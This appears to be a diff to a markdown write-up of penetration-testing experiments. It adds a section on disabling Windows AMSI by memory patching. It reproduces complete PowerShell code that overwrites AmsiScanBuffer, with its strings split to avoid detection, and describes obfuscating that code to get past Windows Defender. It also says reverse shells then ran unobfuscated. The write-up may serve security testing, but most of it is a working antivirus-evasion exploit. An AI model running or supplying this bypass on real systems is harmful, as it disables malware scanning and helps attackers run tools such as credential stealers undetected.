@@ -38,7 +38,59 @@ The better option would be disabling AMSI entirely.
 
 --- 
 
-### Test 2 : Disabling AMSI - Reflection method (To-Do)
+### Test 2 : Disabling AMSI - Memory Patching Method
+
+The following method completely disables AMSI by using a memory patch. Further research needs to be done on how exactly it works, but we were nonetheless able to test that it is an effective method.
+
+Note : This bypass disables AMSI only for the terminal it was executed on.
+
+Source Code from https://aidenpearce369.github.io/offsec/AMSI-Memory-Bypass/ : 
+
+```
+$pinvoke_obj = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WinApi {
+	
+	[DllImport("kernel32")]
+	public static extern IntPtr LoadLibrary(string name);
+	
+	[DllImport("kernel32")]
+	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+	
+	[DllImport("kernel32")]
+	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
+	
+}
+"@
+Add-Type $pinvoke_obj
+$amsiDll = [WinApi]::LoadLibrary("ams"+"i.dll")
+$funcAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScanB"+"uffer")
+$patch = [Byte[]](0xc3,0x80,0x07,0x00,0x57,0xb8)
+$out = 0
+[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, 0x40, [ref] $out)
+[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $funcAddr, $patch.Length)
+[WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, $out, [ref] $null)
+```
+
+However, as the original source code has been out for some time (2022), Windows Defender has already blocked it from running.
+
+![Alt text](misc/detected.png)
+
+Thus, we first obfuscate the code. After obfuscation using the same tool in the first test (Invoke-Obfuscation), we managed to run the script successfully without any error : 
+
+![Alt text](misc/memorypatch.png)
+
+To verify that it works, we enter the string "Invoke-Mimikatz", which is flagged by AMSI as malicious content. As shown below, AMSI works as usual.
+
+![Alt text](misc/mimikatz.png)
+
+After the memory patch, we receieve a different output, stating that powershell could not find a file or script named Invoke-Mimikatz. This is expected, as we didn't actually download mimikatz.
+
+![Alt text](misc/mimikatz2.png)
+
+We were also able to freely run other powershell commands (such as reverse shells) without the need of obfuscating them.
 
 
-
+Other references : https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux
